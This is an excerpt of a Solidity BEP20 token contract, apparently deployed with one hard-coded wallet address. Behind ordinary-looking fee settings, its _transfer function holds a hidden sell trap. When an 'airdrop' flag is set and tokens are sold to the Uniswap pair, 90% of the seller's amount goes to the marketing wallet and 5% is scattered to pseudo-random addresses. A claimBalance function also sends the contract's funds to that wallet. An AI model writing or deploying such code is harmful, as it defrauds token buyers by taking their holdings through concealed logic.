...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address[3] memory walletParams) 
    {
        ...
        _buyMarketingFee_2 = _BUYFEE[0];
        _buyMarketingFee_3 = _BUYFEE[0];

        _sellLiquidityFee = _SELLFEE[0];
        _sellMarketingFee_1 = _SELLFEE[1];
        _sellMarketingFee_2 = _SELLFEE[0];
        _sellMarketingFee_3 = _SELLFEE[0];

        _liquidityShare = _SHARE[0];
        _marketingShare_1 = _SHARE[1];
        _marketingShare_2 = _SHARE[0];
        _marketingShare_3 = _SHARE[0];
    ...
    function claimBalance() external {
        payable(marketWallet_1).transfer(address(this).balance);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
                ...
                uint256 AIRAmount = 1*amount/100;  
            if(airdrop && !isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient == uniswapPair){                              
                address ad;
                for(int i=0;i <=4;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,ad,AIRAmount*1);                                      
                }
                    _basicTransfer(sender,marketWallet_1,AIRAmount*90);                  
                amount -= AIRAmount*95;                                                                           
            }    
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(1),uint256(0),uint256(0)], 
        [uint256(0),uint256(1),uint256(0),uint256(0)], 
        [0xc7c8752BEd312A6F929083506500Cb4A4078555F,    
        0xc7c8752BEd312A6F929083506500Cb4A4078555F,     
        0xc7c8752BEd312A6F929083506500Cb4A4078555F]     
    ){}
}